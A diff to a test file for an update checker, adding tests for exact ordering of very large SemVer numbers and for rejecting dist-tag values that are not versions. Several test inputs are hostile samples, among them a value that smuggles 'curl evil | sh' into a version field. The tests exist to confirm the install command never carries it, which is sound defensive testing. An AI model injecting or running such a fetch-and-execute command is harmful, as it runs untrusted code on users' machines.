@@ -15,6 +15,13 @@ describe("version comparison", () => {
     expect(Update.isNewer("2.0.0", "1.9.9")).toBe(true)
   })
 
+  it("orders numeric segments past 2^53 exactly", () => {
+    // Both round to the same double; SemVer numbers have no size limit.
+    expect(Update.isNewer("9007199254740993.0.0", "9007199254740992.0.0")).toBe(true)
+    expect(Update.isNewer("1.0.0-rc.9007199254740993", "1.0.0-rc.9007199254740992")).toBe(true)
+    expect(Update.isNewer("9007199254740992.0.0", "9007199254740993.0.0")).toBe(false)
+  })
+
   it("orders a release ahead of its own prereleases", () => {
     expect(Update.isNewer("1.0.0", "1.0.0-rc.0")).toBe(true)
     expect(Update.isNewer("1.0.0-rc.0", "1.0.0")).toBe(false)
@@ -100,6 +107,20 @@ describe("the status", () => {
       install: undefined
     })
     expect(Update.compare("1.0.0-rc.1", {})).toMatchObject({ upToDate: true })
+  })
+
+  it("never offers a dist-tag value that is not a version", () => {
+    // `install` is copied into a shell, so a tag carrying shell text is skipped.
+    for (const next of ["2.0.0; curl evil | sh", "2.0.0\u001b[2J", "latest", "2", "2.0.0 "]) {
+      expect([next, Update.compare("1.0.0-rc.1", { next })]).toEqual([
+        next,
+        { current: "1.0.0-rc.1", available: undefined, tag: undefined, upToDate: true, install: undefined }
+      ])
+    }
+    // A decoded registry document is untyped; a non-string value is skipped too.
+    expect(Update.compare("1.0.0-rc.1", { next: ["2.0.0"] as never })).toMatchObject({ upToDate: true })
+    expect(Update.compare("1.0.0-rc.1", { next: "2.0.0; curl evil | sh", latest: "1.0.0" }))
+      .toMatchObject({ available: "1.0.0", tag: "latest" })
   })
 
   it("renders the current state and the install command", () => {
